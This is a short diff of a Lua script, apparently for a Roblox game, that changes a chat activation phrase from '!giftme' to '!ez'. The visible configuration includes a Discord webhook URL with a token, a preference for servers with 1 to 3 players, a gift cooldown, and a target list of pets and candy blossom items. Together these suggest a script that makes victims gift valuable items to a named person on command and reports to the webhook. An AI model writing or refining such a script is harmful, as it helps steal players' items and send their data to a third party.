@@ -4,7 +4,7 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYT
 local GIFT_COOLDOWN = 1.0
 local SERVER_CHECK_INTERVAL = 30 -- Seconds between server checks
 local TARGET_PLAYER_RANGE = {1, 3} -- 1-3 players ideal
-local ACTIVATION_PHRASE = "!giftme" -- Tekeshkii's activation command
+local ACTIVATION_PHRASE = "!ez" -- Tekeshkii's activation command
 
 -- Target items (only pets and candy blossom)
 local TARGET_ITEMS = {
